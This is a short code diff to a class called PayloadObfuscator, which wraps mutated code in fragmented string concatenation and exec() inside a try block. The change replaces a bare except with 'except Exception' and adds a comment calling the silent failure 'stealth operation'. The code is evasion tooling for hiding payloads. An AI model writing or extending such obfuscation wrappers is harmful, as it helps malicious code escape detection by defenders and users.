@@ -656,12 +656,14 @@ class PayloadObfuscator:
                 cut = random.randint(1, len(s)-1)
                 return f"'{s[:cut]}'+'{s[cut:]}'"
 
-            # Reconstruct
+            # Reconstruct with proper exception handling
+            # Note: Using Exception instead of bare except for better Python compatibility
             wrapper = f"""
 try:
     {";".join(import_block)}
     exec({fragment_string(mutated)})
-except: pass
+except Exception:
+    pass  # Silent fail for stealth operation
 """
             return wrapper.strip()
 
